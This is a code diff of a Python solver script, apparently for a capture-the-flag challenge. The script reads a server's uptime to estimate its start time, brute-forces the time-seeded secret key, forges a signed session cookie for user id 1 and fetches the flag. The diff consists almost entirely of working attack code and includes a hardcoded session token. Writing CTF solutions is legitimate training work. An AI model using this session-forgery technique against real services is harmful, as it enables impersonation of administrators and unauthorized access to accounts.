@@ -25,13 +25,18 @@ class Secret:
         secret = b64encode(Secret.rand_bytes(_seed, _size)).decode()
         return secret
 
+
 def get_valid_session() -> str:
-    return post(f'{API}/login', data={'username': 'TEST', 'password=TEST'}).headers['Cookie'].split('session=')[-1]
-    
+    req = post(f'{API}/login', data=b'{"username": "test", "password": "test"}',
+               headers={'Content-Type': 'application/json'})
+    return req.cookies.get('session')
+
+
 def get_approx_time() -> datetime:
     uptime = get(f'{API}/health').json()['uptime']
-    now = datetime.now()
-    return now - datetime.strptime(uptime, '%d day, %H:%M:%S.%f')
+    now = datetime.utcnow()
+    delta = datetime.strptime(uptime, '%d days, %H:%M:%S.%f')
+    return now - timedelta(days=delta.day, hours=delta.hour, minutes=delta.minute, seconds=delta.second, microseconds=delta.microsecond)
     
     
 def brute_force_secret(key: str, session_id: str, start: datetime):
@@ -41,18 +46,16 @@ def brute_force_secret(key: str, session_id: str, start: datetime):
         sec_key = secret.generate_secret(start_time)
         if verify(session_id, sec_key): return sec_key
         start_time += timedelta(microseconds=1)
-        
+
+
 def get_flag(session_id: str):
-    return get(f'{API}/user', headers={'Cookie': f'session={session_id}'}).content
+    return get(f'{API}/user', cookies={'session': session_id}).json()['last_name']
 
 
 if __name__ == '__main__':
     key_ = 'replace_with_random_string'
-    valid_session = get_valid_session() # 'eyJpZCI6Mn0.ZXTqGw.dtpW7kTENz6IFedXK6GqSSBcxNw'
-    approx_time = get_approx_time() # 2023-12-08 08:40:36.600000
+    valid_session = 'eyJpZCI6Mn0.ZZhKGQ.ob7ebG2aHD_OR4BQmYiQOaGDjPk'  # get_valid_session()
+    approx_time = get_approx_time()
     brute_forced = brute_force_secret(key_, valid_session, approx_time)
     forged = sign({'id': 1}, brute_forced)
     print(get_flag(forged))
-    
-    
-    
